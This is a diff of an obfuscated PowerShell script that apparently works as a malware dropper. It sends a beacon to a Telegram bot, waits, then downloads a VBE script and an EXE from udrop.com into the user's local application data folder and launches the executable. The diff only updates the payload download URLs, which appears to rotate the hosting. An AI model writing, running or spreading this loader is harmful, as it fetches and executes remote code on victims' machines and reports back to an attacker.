@@ -68,12 +68,12 @@ $v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
 $v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
 try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
 Start-Sleep -Seconds 400
-$v11="https://www.udrop.com/file/OcrD/1446062403_house.delete"
+$v11="https://www.udrop.com/file/Od75/1446062403_house.delete"
 $v12="1446062403_house.vbe"
 $v13=[Environment]::GetFolderPath("LocalApplicationData")
 $v14=Join-Path $v13 $v12
 try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
-$v16="https://www.udrop.com/file/OcrC/1446062403_key.delete"
+$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
 $v17="1446062403_key.exe"
 $v18=Join-Path $v13 $v17
 try{
@@ -81,4 +81,5 @@ try{
     $v19.DownloadFile($v16,$v18)
     Start-Process -FilePath $v18 -WindowStyle Normal
 }catch{}
+
 exit
